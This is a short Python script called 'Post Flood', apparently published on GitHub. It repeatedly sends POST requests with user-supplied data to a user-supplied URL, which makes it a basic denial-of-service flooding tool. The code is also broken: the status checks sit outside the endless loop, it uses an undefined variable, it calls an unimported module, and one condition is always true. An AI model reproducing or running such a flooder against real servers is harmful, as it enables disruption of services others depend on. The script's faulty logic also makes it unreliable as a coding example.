#!/usr/bin/python3
#
# Post Flood
# by: Israel Comazzetto dos Reis
# github.com/z3xddd

import requests

flood = 0
flood_request = ''
url = input("Enter the url:")
params_date = input("Enter the post data:")

while flood == 0:
    print("Sending floods requests")
    flood_request = requests.post(url, data = params_date)       
if response.status_code == 200:
    print(flood_request.text)
    time.sleep(0.5)
elif response.status_code == 500 or 401:
    print('Server maybe down... :C')
    flood = 1
